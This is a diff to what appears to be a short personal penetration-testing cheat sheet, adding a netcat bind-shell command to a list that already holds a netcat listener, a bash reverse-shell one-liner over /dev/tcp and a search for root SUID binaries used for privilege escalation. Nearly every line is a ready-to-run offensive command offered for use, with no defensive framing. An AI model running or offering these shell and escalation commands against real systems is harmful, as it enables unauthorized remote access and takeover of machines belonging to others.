@@ -1,3 +1,4 @@
 to listen to a port : nc -lvnp 80
 to spawn a bash shell on target : bash -c "bash -i >& /dev/tcp/localhost/port 0<&1"
 to find all bins with SUID  "find / -user root -perm -4000 -print 2>/dev/null"
+to start a shell using netcat "netcat -lvp 5555 -e /bin/sh \;"
